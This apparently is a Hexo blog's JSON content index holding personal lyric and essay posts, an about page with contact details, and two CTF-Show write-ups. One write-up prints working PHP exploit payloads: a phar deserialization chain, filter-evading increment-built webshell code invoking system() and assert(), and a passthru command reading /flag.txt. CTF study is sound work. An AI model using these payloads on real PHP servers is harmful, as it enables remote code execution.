{"meta":{"title":"忆 执 昔 来 的 旅 途","subtitle":"","description":"生活明朗 万物可爱 人间值得 未来可期","author":"xizhi-future","url":"https://xizhi-future.github.io","root":"/"},"pages":[{"title":"个人介绍","date":"2021-10-01T10:54:20.847Z","updated":"2021-10-01T10:54:20.847Z","comments":true,"path":"about/index.html","permalink":"https://xizhi-future.github.io/about/index.html","excerpt":"","text":"联系方式 Email：&#49;&#x33;&#55;&#48;&#x32;&#x32;&#48;&#x32;&#52;&#51;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d; QQ：1370220243 个人信息 00后 现大学本科生 个人博客：https://xizhi-future.github.io Github：https://github.com/xizhi-future 描述 本人爱好广泛，琴棋书画、唱歌跳舞样样喜欢，样样都不精通； 一个文静的外表，一个向往技术流的心； 该博客里将会有个人的自学笔记，同时也可能会记录在生活当中的点点滴滴； 希望参观过我博客的网友们可以互相交流，交个朋友呀！"},{"title":"友情链接","date":"2021-10-01T10:07:13.000Z","updated":"2021-10-01T11:08:35.163Z","comments":false,"path":"friendly-links/index.html","permalink":"https://xizhi-future.github.io/friendly-links/index.html","excerpt":"","text":"努力奋斗IT人 — Angel_Kitty"},{"title":"随笔","date":"2021-10-01T11:20:52.000Z","updated":"2021-10-01T11:48:17.389Z","comments":false,"path":"essayists/index.html","permalink":"https://xizhi-future.github.io/essayists/index.html","excerpt":"","text":"影视有感 生活杂谈 音乐分享"},{"title":"分类","date":"2021-05-23T16:03:00.000Z","updated":"2021-10-01T10:14:53.628Z","comments":false,"path":"categories/index.html","permalink":"https://xizhi-future.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-05-23T16:09:40.000Z","updated":"2021-10-01T10:14:25.513Z","comments":false,"path":"tags/index.html","permalink":"https://xizhi-future.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"世间美好与你环环相扣","slug":"世间美好与你环环相扣","date":"2021-10-01T11:42:25.000Z","updated":"2021-10-01T11:43:15.379Z","comments":true,"path":"2021/10/01/世间美好与你环环相扣/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/","excerpt":"","text":"世间美好与你环环相扣偏偏秉烛夜游 午夜星辰 似奔走之友 爱你每个结痂伤口 酿成的陈年烈酒 入喉尚算可口 怎么泪水 还偶尔失守 邀你细看心中缺口 裂缝中留存 温柔 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 知道你不能 还要你感受 让星光加了一点彩虹 让樱花偷偷 吻你额头 让世间美好 与你环环相扣 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 知道你不能 还要你感受 让星光加了一点彩虹 当樱花开的纷纷扬扬 当世间美好 与你环环相扣","categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"唯愿我们","slug":"唯愿我们","date":"2021-10-01T11:40:26.000Z","updated":"2021-10-01T11:41:42.683Z","comments":true,"path":"2021/10/01/唯愿我们/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/","excerpt":"","text":"唯愿我们从鲜衣怒马到鬓染白发 不过弹指一刹那； 从小桥人家到沧海无涯 匆匆一眼尽繁华。 流年似水， 往事不可追； 光阴似箭， 物是人已非。 让烦恼缠绕心尖， 生活一片颓然； 让痛苦徘徊耳边， 人生全是不满。 感情的遗憾， 不如放手随他。 想送你回家的人， 东西南北都顺路； 想陪你吃饭的人， 酸甜苦辣都可口； 想见你一面的人， 隔山隔海都能来。 生活的刁难， 不如看淡放宽。 生命这一程， 交织着风霜雨雪； 人生这一段， 夹杂着泥泞坎坷。 没有跨不过的河， 没有迈不过的坎。 内心的执迷， 不如随风飘散。 有一往无前， 就有知难而退。 看透了， 便是过眼云烟； 想通了， 不过昙花一现。 不念过去， 不畏将来， 你若不放心上， 岁月便会无恙。 边走边看， 是一种优雅； 边走边忘， 是一份豁达。 敬往事一杯酒， 愿岁月不回头。 唯愿我们： 过去的， 别再遗憾； 未来的， 无须忧虑； 现在的， 加倍珍惜。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"难熬的一夜","slug":"难熬的一夜","date":"2021-10-01T11:38:19.000Z","updated":"2021-10-01T11:39:46.754Z","comments":true,"path":"2021/10/01/难熬的一夜/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/","excerpt":"","text":"难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。 这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就 这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多 次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主 女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受 这一切。哎，总之，我很伤心，更为之心痛。 天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不 是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光 明。 就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。 2021.8.27 6：12","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"查无此人","slug":"查无此人","date":"2021-10-01T11:36:26.000Z","updated":"2021-10-01T11:51:12.530Z","comments":true,"path":"2021/10/01/查无此人/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/","excerpt":"","text":"村上春树说 “你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带 着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成 为善良的人。” 然后，在评论中我看到了，，，查无此人。。。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"胡适与江冬秀","slug":"胡适与江冬秀","date":"2021-10-01T11:34:34.000Z","updated":"2021-10-01T11:35:33.614Z","comments":true,"path":"2021/10/01/胡适与江冬秀/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/","excerpt":"","text":"她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴 上说着表哥表妹，背地里却狠狠背叛了她。 张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。” 她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在 生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。 胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为 江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明 真的就不算什么事儿了。 思君不见，倍感思君；别离难忍，忍痛别离。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"CTF-Show-吃瓜杯","slug":"CTF-Show-吃瓜杯","date":"2021-10-01T11:19:34.000Z","updated":"2021-10-01T11:20:18.220Z","comments":true,"path":"2021/10/01/CTF-Show-吃瓜杯/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/","excerpt":"CTF Show 吃瓜杯篇。","text":"CTF Show 吃瓜杯篇。 CTF Show 吃瓜杯热身123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 123?num=%20010574?num=%0c010574?num=%0a010574 ATTupzip 文件上传 + 文件包含 file_get_contents —&gt; phar 反序列化 文件内容过滤 &lt;? php ，过滤 &lt;? ，无法正常解析为 php 代码 上传成功发现：序列化与反序列化 123456789101112131415161718192021class View &#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun = &quot;:)&quot;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$filename = $_POST[&quot;file&quot;];$stat = @stat($filename); 12__toString() //把类当作字符串使用时触发 echo 对象; $text=$test+$对象； __invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用 生成 .phar 文件： 我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。 1234567891011121314151617181920212223242526272829303132&lt;?phpclass View&#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun=&#x27;:)&#x27;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$phar = new Phar(&#x27;123.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;);$b = new Fun();$b-&gt;fun= new Fun();$b-&gt;fun-&gt;fun=new View(); # 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用$b-&gt;fun-&gt;fun-&gt;fn=&#x27;/flag&#x27;;$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$phar -&gt; setMetadata($b);$phar -&gt; stopBuffering(); &lt;? 过滤，使用 实体html 编码代替 ，&amp;lt; &amp;gt; 访问，生成 123.phar 更改后缀得到 123.zip 上传 查询 123.zip 1file=phar://123.zip 魔女 注册 注册成功，登录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263layui.use([&#x27;layer&#x27;, &#x27;form&#x27;,&#x27;table&#x27;,&#x27;element&#x27;], function()&#123; var layer = layui.layer ,form = layui.form ,table = layui.table ,element = layui.element &#125;); function home()&#123; $.cookie(&#x27;m&#x27;,&#x27;main&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function logout()&#123; $.cookie(&#x27;m&#x27;,&#x27;logout&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function saveAvatar()&#123; $.cookie(&#x27;m&#x27;,&#x27;download&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;avatar.jpg|true&#x27;); window.open(location.href); &#125; function avatar()&#123; layer.prompt(&#123; formType: 0, value: &#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;, title: &#x27;修改头像&#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;xixi|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changeavatar&#x27;); location.replace(location.href); &#125;); &#125; function profile()&#123; $.cookie(&#x27;m&#x27;,&#x27;page&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function changePSW()&#123; layer.prompt(&#123; formType: 0, value: &#x27;请输入当前密码&#x27;, title: &#x27;修改密码&#x27;, &#125;, function(value, index, elem)&#123; $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+value); layer.close(index); layer.prompt(&#123; formType: 0, value: &#x27;请输入新密码&#x27;, title: &#x27;修改密码&#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,$.cookie(&#x27;ctfshow&#x27;)+&#x27;|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changepwd&#x27;); location.replace(location.href); &#125;); &#125;); &#125; shellme_Revenge 1/?looklook=1 1&lt;?phperror_reporting(0);if ($_GET[&#x27;looklook&#x27;])&#123; highlight_file(__FILE__);&#125;else&#123; setcookie(&quot;hint&quot;, &quot;?looklook&quot;, time()+3600);&#125;if (isset($_POST[&#x27;ctf_show&#x27;])) &#123; $ctfshow = $_POST[&#x27;ctf_show&#x27;]; if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123; if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; eval($ctfshow); &#125;else&#123; echo(&quot;fucccc hacker!!&quot;); &#125; &#125;&#125; else &#123; phpinfo();&#125;?&gt; assert() 1&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;eval($___($_[_])); // ASSERT($_POST[_]); system() 1&lt;?php$_=C;//$_=$_[0]; //Cprint_r($_);$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__; // Sprint_r($__);//$__=$_;$__++;$__++;$__++;$__++;$__++;$__++; // Y$___.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Sprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Tprint_r($__);$__=$_;$__++;$__++;$___.=$__; // Eprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Mprint_r($__);print_r($___); //SYSTEM$____=_;$__=$_;//print_r($_);$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;print_r($____);//_POSTprint_r($___);//SYSTEM$_=$$____;eval($___($_[_])); // SYSTEM($_POST[_]); 1&lt;?php//$_=[C];$_=$_[0];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;eval($___($_[_]));//$_=C;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;eval($___($_[_]));highlight_file(__FILE__);$a = $_GET[&#x27;a&#x27;];if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; echo &#x27;111&#x27;; eval($a);&#125; 1#get?looklook=1#postctf[show=%24_%3DC%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%24__%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B&amp;_=ls; 长度限制： 1# get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;); 吃瓜 50 4B 03 04 ZIP文件 这是用来迷惑的 存在一个文本文档，是个 图片，浏览器访问 扫描得到 cfhwc19abika_etso{h_u_e_ui1} 查看图片属性 1✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==# 不知道怎末用 二、总结命令执行做题思路 一眼就有思路的直接掠过 一眼没有思路的，首先根据正则的过滤分类，决定思路 有回显？无回显？ eval exec eval 还是 system 无字母数字类？ 异或？或？取反？自增？ 过滤 ; 过滤 ‘ ‘ “ “ 找 phpinfo() 看被 ban 的函数名","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-Misc入门","slug":"CTF-Show-Misc入门","date":"2021-10-01T11:17:47.000Z","updated":"2021-10-01T11:18:54.358Z","comments":true,"path":"2021/10/01/CTF-Show-Misc入门/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/","excerpt":"CTF Show Misc 入门篇。","text":"CTF Show Misc 入门篇。 Misc 入门1.1 misc 1 — QQ截图 直接识别图片内容 图片直接是这个，我们可以 QQ 截图，使用当中的 屏幕识别 即可识别出文字 1.2 misc 2 — png 图片识别 记事本打开是这样，那肯定不是 .txt 文本文件 使用 Editor010 打开 说明这是 png 文件，修改后缀，然后 QQ 屏幕识图即可 补充知识：Python3 进行图片识别 https://segmentfault.com/a/1190000014091417 1.3 misc 3 — 查看 bpg 图片是 bpg 图片，需要专门的查看工具 https://bellard.org/bpg/ 12# 使用\\bpj\\bpgview.exe misc3.bpg 1.4 misc 4 — 图片格式 + 文件头图片格式 JPEG文件头：FF D8 FF 文件尾：FF D9 TGA未压缩的前4字节 00 00 02 00RLE压缩的前5字节 00 00 10 00 00 PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82 GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3B BMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M) TIFF (tif) 文件头：49 49 2A 00 ico 文件头：00 00 01 00 Adobe Photoshop (psd) 文件头：38 42 50 53 一个一个查看，修改后缀 1.txt png 2.txt jpg 3.txt bmp 4.txt gif 5.txt tif 6.txt webp 1.5 misc 5 — png 文件尾 添内容 010打开 发现在 png 的文件尾后面多出了 1.6 misc 6 — jpg 文件 添内容 1.7 misc 7 — flag在图片文件信息中flag在图片文件信息中。 常用到的手段还有 右键–属性 工具 图虫查看器 能够查看图片的详细信息 1.8 misc 8 — flag在图片文件中图片文件中 — binwalk foremostflag在图片文件中图片文件中。 010 打开 可以发现，该 png 图片当中 还包含着一张 png 图片 图片隐藏文件 binwalk foremost https://blog.csdn.net/Sc0fie1d/article/details/101602492 1.9 misc 9 — flag在图片块里 1.10 misc 10 — flag在图片数据里 两个 IDAT 块 binwalk 工具 解释：zlib 是 PNG IDAT 块数据可选的压缩格式 题者自己生成了一段 zlib 压缩数据，然后加上长度位、标识位、与 CRC 校验位，将其伪装成了一个 IDAT 块，插在图片当中 而 binwalk 会自动找到 zlib 块并提取出来解压，所以最终得到的提取结果中就含有 flag 了 1.11 misc 11 — flag在另一张图里 两个 IDAT 块 再次使用上一关的解法，不可行 搜集资料之后，必须首先将多余的那个 IDAT 块删除才可 工具 tweakpng 将第一个 IDAT 块右键删除即可 ctfshow{44620176948fa759d3eeafeac99f1ce9} 1.12 misc 12 — flag在另一张图里flag在另一张图里。 与上一关的做法相同，只不过，不确定删除几个 IDAT 块，每次删完一个保存尝试查看即可 1.13 misc 13 — flag位置在图片末尾flag位置在图片末尾。 可以看到一部分类似 flag 的字符串 我们将乱七八糟的删除即可，每隔一个删除一个 1.14 misc 14 — flag在那张图里flag在那张图里。 记得从 FF D8 开始 新建一个新的文件 jpg 打开 注意：QQ识图 有时不准确，比如 0 和 8 1.15 misc 15 — flag被跳过去了 1.16 misc 16 — flag在图片数据里flag在图片数据里。 binwalk 提取文件 1.17 misc 17 — flag在图片数据里 — zstegflag在图片数据里。 zsteg 安装 及 使用 zsteg可以检测PNG和BMP图片里的隐写数据。 目前，zsteg支持检测： LSB steganography in PNG &amp; BMPzlib-compressed dataOpenStegoCamouflage 1.2.1LSB with The Eratosthenes set 1zsteg misc17.png 12zsteg -E &quot;extradata:0&quot; misc17.png &gt; 1.txtbinwalk -e 1.txt 1.18 misc 18 — flag在标题、作者、照相机和镜头型号里flag在标题、作者、照相机和镜头型号里。 右键属性查看 1.19 misc 